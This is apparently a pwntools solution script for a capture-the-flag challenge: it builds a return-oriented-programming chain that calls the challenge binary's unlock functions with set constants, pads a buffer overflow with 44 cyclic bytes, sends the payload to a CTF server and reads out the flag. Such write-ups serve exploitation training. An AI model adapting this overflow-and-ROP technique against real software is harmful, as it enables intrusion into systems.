 #!/usr/bin/env python3

from pwn import *
import re

context.log_level = logging.ERROR

exe = ELF("./chall")

context.binary = exe
context.terminal = ["termite","-e"]


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("ctf.cybr.club", 2002)


def main():
    r = conn()


    flag_txt = next(exe.search(b"flag.txt"))

    rop = ROP(exe)

    rop.find_file(flag_txt)
    rop.unlock_one()
    rop.unlock_two(0x12345678)
    rop.unlock_three(0x1e9c66e6, 0xadaf1212)
    rop.read_flag()

    payload = cyclic(44)
    payload += rop.chain()
    r.sendline(payload)
    
    print(rop.dump())

    print(re.search("(FLAG{.*})",r.recvall().decode()).group(1))


if __name__ == "__main__":
    main()
